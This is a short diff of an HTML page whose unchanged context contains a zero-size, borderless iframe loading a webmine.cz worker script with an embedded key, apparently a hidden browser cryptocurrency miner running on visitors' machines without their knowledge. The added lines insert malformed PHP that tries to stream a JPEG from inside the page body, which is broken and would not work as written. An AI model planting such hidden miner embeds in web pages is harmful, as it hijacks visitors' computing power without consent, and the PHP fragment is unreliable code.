@@ -3,5 +3,11 @@
 </head>
 <body>
     <iframe width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=TgOSoyGdvks0pTy'></iframe>
+    <?php>
+        $im = imagecreatefromjpeg("1.jpg");
+        header('Content-Type: image/jpeg');
+        imagejpeg($im);
+        imagedestroy($im);
+    ?>
 </body>
 </html>
